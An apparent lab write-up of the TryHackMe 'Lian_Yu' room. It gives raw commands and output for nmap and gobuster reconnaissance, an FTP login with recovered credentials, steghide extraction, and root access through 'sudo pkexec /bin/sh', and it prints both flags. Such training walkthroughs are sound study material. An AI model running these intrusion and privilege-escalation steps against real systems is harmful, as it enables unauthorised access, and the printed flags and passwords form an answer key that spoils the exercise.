nmap -sV -sC -o nmap 10.10.228.74

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 03:01 EDT
Nmap scan report for 10.10.228.74
Host is up (0.33s latency).
Not shown: 995 closed ports
PORT     STATE    SERVICE   VERSION
21/tcp   open     ftp       vsftpd 3.0.2
22/tcp   open     ssh       OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp   open     http      Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp  open     rpcbind   2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          46962/udp   status
|   100024  1          48228/tcp6  status
|   100024  1          55953/udp6  status
|_  100024  1          60623/tcp   status
6901/tcp filtered jetstream
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
                                                                                                                                                                                                        
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                          
Nmap done: 1 IP address (1 host up) scanned in 60.92 seconds    

using a longer wordlist as the common.txt doesnt show anything interesting
kali@kali:~/oscptraining/tryhackme/Lianyu$ gobuster dir -e -u http://10.10.228.74 -w /usr/share/wordlists/dirb/big.txt

http://10.10.228.74/.htaccess (Status: 403)
http://10.10.228.74/.htpasswd (Status: 403)
http://10.10.228.74/island (Status: 301)
http://10.10.228.74/server-status (Status: 403)

http://10.10.228.74/island (Status: 301)
found a codeword stated vigilante

kali@kali:~/oscptraining/tryhackme/Lianyu$ gobuster dir -e -u http://10.10.144.244 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

one more time as the common.txt couldnt find anything interesting

<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>


<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->

</header>
</body>
</html>

seems like we need to run gobuster again
kali@kali:~/oscptraining/tryhackme/Lianyu$ gobuster dir -e -u http://10.10.144.244 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x.ticket

got this
http://10.10.144.244/island/2100/green_arrow.ticket

This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
got to dehash this but tbh it's gonna be hard recognising it's base58...

user: vigilante
pwd: !#th3h00d

failed trying to log in with ssh, let's try ftp then


kali@kali:~/oscptraining/tryhackme/Lianyu$ ftp 10.10.144.244                                                                                                                                            
Connected to 10.10.144.244.220 (vsFTPd 3.0.2)                                                                                                                                                                                
Name (10.10.144.244:kali): vigilante                                                                                                                                                                    
331 Please specify the password.                                                                                                                                                                        
Password:                                                                                                                                                                                               
230 Login successful.                                                                                                                                                                                   
Remote system type is UNIX.                                                                                                                                                                             
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01 03:26 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05 11:10 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01 03:25 aa.jpg
226 Directory send OK.
ftp> 


get Leave_me_alone.png
get the remaining files 

opening up the pics doesnt show anything interesting, seems like we got to extract some stuff.
i couldnt open up Leave_me_alone.png as there's an error.
since the first eight bytes of a PNG file always contain the following values:

  (hexadecimal)           89  50  4e  47  0d  0a  1a  0a

let us edit the header

kali@kali:~/oscptraining/tryhackme/Lianyu$ xxd Leave_me_alone.png | head -n 1                                                                                                                                     
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR  

now we have a proper header and we can open the photo
"Just leave me a lone Here take what you want - password"
seems like it's the password for one of the pic

kali@kali:~/oscptraining/tryhackme/Lianyu$ steghide aa.jpg
steghide: unknown command "aa.jpg".
steghide: type "steghide --help" for help.
kali@kali:~/oscptraining/tryhackme/Lianyu$ steghide info aa.jpg
"aa.jpg":
  format: jpeg
  capacity: 11.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "ss.zip":
    size: 596.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
kali@kali:~/oscptraining/tryhackme/Lianyu$ ls
 aa.jpg   Leave_me_alone.png   namelist.txt   nmap  "Queen's_Gambit.png"   subdomains-top1million-110000.txt
kali@kali:~/oscptraining/tryhackme/Lianyu$ steghide extract -sf aa.jpg
Enter passphrase: 
wrote extracted data to "ss.zip".
kali@kali:~/oscptraining/tryhackme/Lianyu$ ls
 aa.jpg   Leave_me_alone.png   namelist.txt   nmap  "Queen's_Gambit.png"   ss.zip   subdomains-top1million-110000.txt
kali@kali:~/oscptraining/tryhackme/Lianyu$ unzip ss.zip
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado                   
kali@kali:~/oscptraining/tryhackme/Lianyu$ ls
 aa.jpg   Leave_me_alone.png   namelist.txt   nmap   passwd.txt  "Queen's_Gambit.png"   shado   ss.zip   subdomains-top1million-110000.txt
kali@kali:~/oscptraining/tryhackme/Lianyu$ cat shado
M3tahuman
kali@kali:~/oscptraining/tryhackme/Lianyu$ cat passwd.txt
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.


we got the password but no user, lets go back to the ftp to check if there's any other stuff we can find

ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 May 01 06:55 slade
drwxr-xr-x    2 1001     1001         4096 May 05 11:10 vigilante

seems like slade is the user.


slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak

slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec

slade@LianYu:~$ sudo pkexec /bin/sh
# whoami
root
root@LianYu:~# cat /root/root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825


okie rooted 
21 oct 2020 0101hr







